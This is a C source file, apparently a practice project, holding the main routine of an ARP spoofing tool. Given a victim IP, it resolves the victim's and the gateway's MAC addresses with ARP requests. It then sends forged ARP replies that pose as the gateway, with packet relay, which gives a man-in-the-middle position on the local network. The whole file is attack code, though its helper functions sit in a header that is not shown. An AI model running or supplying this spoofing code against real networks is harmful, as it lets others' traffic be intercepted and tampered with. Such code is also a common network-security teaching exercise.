#include "myARPspoofing.h"

int main(int argc, char* argv[]){
	struct in_addr      victim_ip;
    struct ether_addr   victim_mac, gateway_mac;
	int 		i = 0;
	myPCAP		pcap_class;
	myIP		ip_class;
	myMAC		mac_class;
	myARPheader	arp_class;

	// program usage
	if(argc != 2){
		printf("program usage: %s <victim ip>\n", argv[0]);
		return -1;
	}

	// check if the target ip is invalid
    if(inet_pton(AF_INET, argv[1], &victim_ip.s_addr) == 0){
    	printf("No such IP : %s\n", argv[1]);
        return -1;
    }

    // setting information
    pcap_class.pcd_init(&pcap_class.pcd, &pcap_class.device);
    ip_class.getMyIp(&ip_class.attacker_ip);
    mac_class.getMyMac(&mac_class.my_mac_address);
    ip_class.getGatewayIp(&ip_class.gateway_ip);
    // send arp request packet to get gateway mac info.
    arp_class.setARPpacket(mac_class.my_mac_address, mac_class.broadcastMac,
							mac_class.my_mac_address, ip_class.attacker_ip,
							mac_class.zero_fill_mac, ip_class.gateway_ip,
							ARPOP_REQUEST, pcap_class.pcd);
    pcap_class.sendARPpacket(arp_class);
    pcap_class.pcapCapture(&ip_class.gateway_ip, &gateway_mac);	// get ARP reply, filtering it to get correct reply
    // send arp request packet to get victim mac info.
    arp_class.setARPpacket(mac_class.my_mac_address, mac_class.broadcastMac,
							mac_class.my_mac_address, ip_class.attacker_ip,
							mac_class.zero_fill_mac, victim_ip,
							ARPOP_REQUEST, pcap_class.pcd);
    pcap_class.sendARPpacket(arp_class);
    pcap_class.pcapCapture(&victim_ip, &victim_mac);	// get ARP reply, filtering it to get correct reply

    // test if it worked well
    printf("my ip address (attacker): %s\n", inet_ntoa(ip_class.attacker_ip));
    printf("gateway ip address (GW) : %s\n", inet_ntoa(ip_class.gateway_ip));
    printf("my mac address: ");
    for(i=0;i<ETHER_ADDR_LEN;i++)
    	printf("%02X%c", mac_class.my_mac_address.ether_addr_octet[i], ((i!=ETHER_ADDR_LEN-1) ? ':' : '\n'));
    printf("victim mac address: ");
    for(i=0;i<ETHER_ADDR_LEN;i++)
    	printf("%02X%c", victim_mac.ether_addr_octet[i], ((i!=ETHER_ADDR_LEN-1) ? ':' : '\n'));
    printf("gateway mac address: ");
    for(i=0;i<ETHER_ADDR_LEN;i++)
    	printf("%02X%c", gateway_mac.ether_addr_octet[i], ((i!=ETHER_ADDR_LEN-1) ? ':' : '\n'));
    
    // arp spoofing (relay included)
    // set ARP packet to reply packet and pass it to the arp_spoofing function
	arp_class.setARPpacket(mac_class.my_mac_address, victim_mac,
							mac_class.my_mac_address, ip_class.gateway_ip,
							victim_mac, victim_ip,
							ARPOP_REPLY, pcap_class.pcd);
    pcap_class.arpSpoofing(arp_class, ip_class, mac_class, victim_ip, gateway_mac);

	return 1;
}